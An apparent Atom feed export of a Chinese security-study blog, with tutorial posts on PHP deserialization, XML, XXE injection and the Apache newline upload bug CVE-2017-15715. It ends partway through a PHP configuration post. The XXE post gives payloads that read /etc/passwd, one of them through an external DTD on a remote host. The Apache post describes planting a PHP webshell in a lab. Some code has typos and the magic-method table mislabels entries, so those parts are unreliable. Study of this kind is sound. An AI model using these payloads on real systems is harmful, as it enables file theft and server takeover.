<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  <subtitle>Sinevil</subtitle>
  <link href="https://sinevil.github.io/atom.xml" rel="self"/>
  
  <link href="https://sinevil.github.io/"/>
  <updated>2021-07-30T07:43:47.874Z</updated>
  <id>https://sinevil.github.io/</id>
  
  <author>
    <name>Mr.Li</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="https://sinevil.github.io/2021/07/27/fanxuhua/"/>
    <id>https://sinevil.github.io/2021/07/27/fanxuhua/</id>
    <published>2021-07-27T01:21:18.000Z</published>
    <updated>2021-07-30T07:43:47.874Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PHP的类和对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">classs person&#123;</span><br><span class="line"><span class="comment">//定义类属性(类似变量),public 代表可见性(共有)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;joke&#x27;</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name.<span class="string">&quot; is smile...\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$psycho</span> = <span class="keyword">new</span> person();<span class="comment">//根据person类实例化对象</span></span><br><span class="line"><span class="variable">$psycho</span>-&gt;smile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#定义了一个person类，在类中定义了一个public类型的变量$name和类的方法smile，然后实例化一个对象$psycho，去调用person类里面的smile方法</span></span><br></pre></td></tr></table></figure><p><strong>魔术方法</strong></p><table><thead><tr><th align="center">方法名</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct</td><td align="center">构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td></tr><tr><td align="center">__destruct</td><td align="center">析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td align="center">__toString</td><td align="center">使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td align="center">__sleep()</td><td align="center">使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td align="center">__destruct()</td><td align="center">对象被销毁时触发</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用不可访问的方法时触发</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用unset()时触发</td></tr><tr><td align="center">__invoke()</td><td align="center">当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><blockquote><p>具体描述可见<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP手册</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;wuyifan&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; is wuqian...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//construct,destruct,toString类似</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__wakeup()方法&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__set()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__get()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jl</span> = <span class="keyword">new</span> animal();<span class="comment">#调用了__construct()方法  创建对象的时候用</span></span><br><span class="line"><span class="variable">$jl</span>-&gt;name = <span class="number">1</span>;<span class="comment">#调用了__set()方法私有属性赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jl</span>-&gt;name;<span class="comment">#调用了__get()方法私有属性赋值</span></span><br><span class="line"><span class="variable">$esr_jl</span> = serialize(<span class="variable">$jl</span>);</span><br><span class="line"><span class="comment">//print_r($ser_jl);</span></span><br><span class="line">print_r(userialize(<span class="variable">$ser_jl</span>));<span class="comment">#调用了__wakeup()方法，使用反序列化函数时调用</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#调用了__destruct()方法 结束程序调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**序列化和反序列化**</span><br><span class="line"></span><br><span class="line">为了有效地储存或传递数据，同时不丢失其类型和结构，经常需要利用序列化和反序列化函数对数据进行处理</span><br><span class="line"></span><br><span class="line">序列化函数返回字符串，此字符串包含了表达值的字节流，可以储存在任何地方</span><br><span class="line"></span><br><span class="line">反序列化函数对单一的已序列化的变量进行操作，将其转换为原来的值</span><br><span class="line"></span><br><span class="line">这两个过程结合起来可以轻松的储存和传输数据，使程序更具维护性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**序列化**</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$team</span> = <span class="string">&#x27;sl&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$steam_name</span> = <span class="string">&#x27;star&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$steam_group</span> = <span class="string">&#x27;gogo&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">star</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$team_member</span> = <span class="string">&#x27;fight&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化的结果为：</p><p>对象类型:对象长度:对象名称:类中变量个数:{变量类型:长度:“名称”;类型:长度:””值”;···}</p><p>0:4:test:3:{s:4:”team”;s:2:”sl”;···}</p><blockquote><p>当变量收到不同修饰符修饰进行序列化后，序列化后的变量的长度和名称都会发生变化</p><p>public 变量$steam的长度为4，正常输出</p><p>private 会在变量$team_name前加上类的名称，并且长度会比正常的多两个字节</p><p>protected 会在变量$team_group前边加上*，并且长度会多三个字节</p></blockquote><p>序列化格式中的字母含义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a - arrayb - booleano  - common objects - stringr - referenceR - pointer reference</span><br><span class="line">d - doublei - <span class="built_in">integer</span>C  - custom objectN - null0 - classU -unicode string</span><br></pre></td></tr></table></figure><p><strong>反序列化</strong></p><p>定义一个字符出，然后用个反序列化函数unserialize进行反序列化处理，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ser</span> = <span class="string">&#x27;0:4:test:3&#123;s:4:&quot;team&quot;;s:2:&quot;sl&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span> = userialize(<span class="variable">$ser</span>);</span><br><span class="line">var_dump(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>php反序列化漏洞</strong></p><p>在反序列化过程中，其功能类似于复原了一个对象，并赋予其相应的得属性值，如果让攻击者操纵任意反序列数据，那么攻击者就可以实现任意类对象的创建，如果一些类存在自动触发得方法(魔术函数)，就有可能以此为跳板而进攻系统应用。</p><blockquote><p>漏洞成因：</p><ol><li>uniserialize()函数可控</li><li>存在魔法函数</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;PHP的类和对象&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="注入类漏洞" scheme="https://sinevil.github.io/tags/%E6%B3%A8%E5%85%A5%E7%B1%BB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XML</title>
    <link href="https://sinevil.github.io/2021/07/26/XML/"/>
    <id>https://sinevil.github.io/2021/07/26/XML/</id>
    <published>2021-07-26T08:33:08.000Z</published>
    <updated>2021-07-26T11:43:46.925Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XML</strong></p><ul><li>什么是XML</li></ul><p>XML是一种可扩展标记 ，用来结构化、储存以及传输信息</p><ul><li>XML的组成</li></ul><p>XML由3个部分构成，它们分别是：XML声明，文档类型定义，文档元素</p><ul><li>XML实例</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明(定义了XML的版本和编码)--&gt;</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;  </span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCYTPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)</span><br><span class="line">  &lt;!ELEMRNT to (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT from (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT heading (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT body (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">]&gt;  </span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;    </span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don<span class="string">&#x27;t forget the meeting&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/note&gt;</span></span><br></pre></td></tr></table></figure><ul><li>XML声明</li></ul><p>XML声明以<?开头，以?>结尾。version属性是必选的，他定义了XML的版本，encoding的属性是可选的。定义了XML进行解码所用的字符集</p><ul><li>文档类型定义</li></ul><p> 文档类型定义是用来约束一个XML文档的书写规范</p><ol><li>文档类型定义的基础语法</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line"></span><br><span class="line">2. wai对文档类型定义直接放在XML文档中，称为内部定义。</span><br><span class="line"></span><br><span class="line">​```bash</span><br><span class="line">&lt;!DOCYTPE note [  <span class="comment">#定义此文档的类型</span></span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)  <span class="comment">#定义note的四个元素</span></span><br><span class="line">  &lt;!ELEMRNT to (<span class="comment">#PCDATA)&gt;  #定义元素类型</span></span><br><span class="line">  &lt;!ELEMRNT from (<span class="comment">#PCDATA)&gt;  </span></span><br><span class="line">  &lt;!ELEMRNT heading (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT body (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>外部文档引用</li></ol><p>文档类型定义的内容也可以单独保存为单独的DTD文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#DTD引用本地文档</span></span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM “文件名“&gt;</span><br><span class="line"><span class="comment">#DTD引用公共网络上的DTD</span></span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC <span class="string">&quot;DTD名称&quot;</span> <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;XML&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是XML&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;XML是一种可扩展标记 ，用来结构化、储存以及传输信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XML的组成&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;XML由3个部分构成，它们分别是：XML</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="文本语言" scheme="https://sinevil.github.io/tags/%E6%96%87%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://sinevil.github.io/2021/07/26/XXE/"/>
    <id>https://sinevil.github.io/2021/07/26/XXE/</id>
    <published>2021-07-26T08:23:26.000Z</published>
    <updated>2021-07-27T01:26:56.593Z</updated>
    
    <content type="html"><![CDATA[<h2> XXE漏洞 </h2><p><strong>什么是XEE</strong></p><p>XEE也称为XML外部实体注入漏洞，该漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中获取数据，</p><p><strong>危害</strong></p><p>当XML引用外部实体时，通过·构造恶意内容，可导致读取任意文件，执行系统命令，探测内网端口，攻击内网网站等危害</p><p><strong>构造实体注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接通过DTD外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#通过DTD文档引入外部DTD文档，再引入外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY d SYSTEM <span class="string">&quot;http://192.168.17.3:3378/test.dtd&quot;</span>&gt;</span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#test.dtd</span></span><br><span class="line">&lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><ul><li>判断漏洞存在的方法</li></ul><ol><li>通过注入外部实体，通过bp抓包观察程序是如何传输数据的</li><li>尝试插入外部实体，观察回显</li><li>尝试插入外部地址的外部实体，观察是否有请求</li></ol><ul><li>漏洞情景分类</li></ul><ol><li>有回显</li></ol><p>可以直接在页面中看到payload的执行结果，直接利用进行敏感文件获取，直接输出结果</p><ol start="2"><li>无回显</li></ol><p>看不到payload的执行结果，可通过外带使用外带数据通道提取数据</p><p><strong>防范方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用开发语言提供的禁用外部实体的方法</span><br><span class="line"><span class="comment">#php：</span></span><br><span class="line">xml_disable_entity_loader(<span class="literal">true</span>)</span><br><span class="line"><span class="comment">#java:</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newinstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt; XXE漏洞 &lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;什么是XEE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XEE也称为XML外部实体注入漏洞，该漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="XML漏洞" scheme="https://sinevil.github.io/tags/XML%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Apache换行解析漏洞</title>
    <link href="https://sinevil.github.io/2021/07/25/apachejiexi/"/>
    <id>https://sinevil.github.io/2021/07/25/apachejiexi/</id>
    <published>2021-07-25T01:29:31.000Z</published>
    <updated>2021-07-27T01:27:40.560Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞(CVE-2017-15715)</strong></p><ul><li>影响版本</li></ul><p>Apache httpd 2.4.0 ~ 2.4.29</p><ul><li>原理</li></ul><p>apache在修复第一个后缀名解析漏洞时，用正则表达式匹配后缀。在正则表示式中，<code>$</code>用来匹配字符串结尾位置，但如果设置了RegExp对象的Multiline属性，则$也匹配<code>\n</code>或者<code>\r</code>,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#httpd解析php文件的表达式</span></span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">#&lt;FilesMatch&gt; 中指定的表达式可以将“$”匹配到恶意文件名中的换行符，而不是仅匹配文件名的末尾。这可以在某些文件的上传被外部阻止的环境中被利用，但只能通过匹配文件名的尾随部分</span></span><br></pre></td></tr></table></figure><p>由于是黑名单匹配，所以我们的上传可以成功，并且在解析时会匹配换行符，我们访问时在php后加上%0a即可正常访问。</p><p><strong>漏洞复现</strong></p><ul><li>打开环境，可以清晰的发现是一个文件上传点，我们首先选择对其查看源码</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210723104444.png" alt="QQ截图20210723104444"></p><ul><li>源码中并无法确认是属于什么类型的文件上传，但是文件上传只是一个站的其中一个功能，选择对这个站进行信息搜集</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725091747.png" alt="QQ截图20210725091747"></p><ul><li>发现其中间件有Apache，且Apache版本为2.4.10</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725102727.png" alt="QQ截图20210725102727"></p><ul><li>搜寻到Apache的换行解析漏洞，通过bp抓包上传一个一句话的<code>.php</code>文件并在其后缀加上换行符</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725092156.png" alt="QQ截图20210725092156"></p><ul><li>将其发包，通过phpinfo();函数判断其是否上传成功并获取shell</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725092319.png" alt="QQ截图20210725092319"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Apache换行解析漏洞(CVE-2017-15715)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;影响版本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache httpd 2.4.0 ~ 2.4.29&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;a</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="中间件漏洞" scheme="https://sinevil.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻防(持续)</title>
    <link href="https://sinevil.github.io/2021/07/23/AWD/"/>
    <id>https://sinevil.github.io/2021/07/23/AWD/</id>
    <published>2021-07-23T10:34:04.000Z</published>
    <updated>2021-07-23T11:00:33.680Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一次攻防实战</strong></p><ul><li>准备阶段，防御流程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;第一次攻防实战&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备阶段，防御流程&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=</summary>
      
    
    
    
    <category term="实战" scheme="https://sinevil.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="AWD攻防" scheme="https://sinevil.github.io/tags/AWD%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>PHP常用配置</title>
    <link href="https://sinevil.github.io/2021/07/22/phppeizhi/"/>
    <id>https://sinevil.github.io/2021/07/22/phppeizhi/</id>
    <published>2021-07-22T01:46:55.000Z</published>
    <updated>2021-07-26T11:40:20.319Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">语言相关配置</span><br><span class="line">engine  <span class="comment">#设置php引擎是否可用，默认值On</span></span><br><span 